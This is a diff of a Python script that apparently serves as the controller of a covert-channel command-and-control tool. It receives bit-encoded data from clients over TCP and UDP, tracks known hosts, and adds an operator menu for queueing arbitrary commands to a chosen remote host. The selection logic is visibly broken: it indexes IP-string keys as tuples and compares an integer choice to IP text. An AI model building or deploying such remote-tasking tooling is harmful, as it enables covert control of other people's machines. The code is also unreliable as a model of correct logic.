@@ -1,6 +1,7 @@
 import socket as Socket
 from socket import socket
 import threading
+import time
 
 #TODO look into multiple sources. Convert main binary list to dict with ip/binary pairs?
 
@@ -40,7 +41,7 @@ def handle_TCP(TCPsock:socket,BinaryHolder:list,senderIp:list):
             clientSock, clientAddr = TCPsock.accept()
         except Socket.timeout:
             continue
-        recv_client_list(clientAddr)
+        recv_client_list(clientAddr[0])
 
         LOCK.acquire()
         BinaryHolder.append("0")
@@ -54,7 +55,7 @@ def handle_TCP(TCPsock:socket,BinaryHolder:list,senderIp:list):
             break
         except Socket.timeout:
             continue
-    clientSock.send(send_client_list(clientAddr).encode())
+    clientSock.send(send_client_list(clientAddr[0]).encode())
     clientSock.close()
     senderIp.append(clientAddr[0])
 
@@ -71,7 +72,7 @@ def decode(BinaryList:list):
 
 
 #Determines state of client
-def recv_client_list(clientAddr:tuple):
+def recv_client_list(clientAddr):
     global LISTLOCK
     global HOSTDICT
     if clientAddr not in HOSTDICT.keys(): #Checks if a client is a known host
@@ -81,7 +82,7 @@ def recv_client_list(clientAddr:tuple):
 
 
 #Fetch queued commands and return
-def send_client_list(clientAddr:tuple) -> str: 
+def send_client_list(clientAddr) -> str: 
     global LISTLOCK
     global HOSTDICT
     with LISTLOCK:
@@ -117,17 +118,50 @@ def receive_traffic(serverSocketUDP:socket,serverSocketTCP:socket):
         thread.join()
 
     output = decode(BinaryList) 
-    print(senderIp[0]+": "+output)
+    if output != "":
+        print(senderIp[0]+": "+output)
 
 
-def main():
-    global EOF
-
+def receiver_thread():
     serverSocketTCP = build_socket(Socket.SOCK_STREAM,HOST,PORT)
     serverSocketTCP.listen(5)
     serverSocketUDP = build_socket(Socket.SOCK_DGRAM,HOST,PORT)
 
     while True:
         receive_traffic(serverSocketUDP,serverSocketTCP)
+
+
+def display_options():
+    ipList = []
+    selectedHost = "INVALID"
+    with LISTLOCK:
+        for tuple in HOSTDICT.keys():
+            ipList.append(tuple[0])
+    ipList.sort()
+    optionNum = 0
+    for ip in ipList:
+        print(str(optionNum+1)+": "+ip)
+        optionNum += 1
+    print(str(optionNum+1)+": refresh")
+    userChoice = int(input("Select option: ").strip())-1
+    if str(userChoice) == str(optionNum): #Refresh option
+        print("Refreshing...")
+        return
+    else:
+        with LISTLOCK:
+            for tuple in HOSTDICT.keys():
+                if tuple[0] == userChoice:
+                    selectedHost = tuple
+    command = input("Input command: ").strip()
+    with LISTLOCK:
+        HOSTDICT[selectedHost].append(command)
+
+
+def main():
+    mainReceiver = threading.Thread(target=receiver_thread,args=())
+    mainReceiver.start()
+    while True:
+        time.sleep(1)
+        display_options()
 
 main()
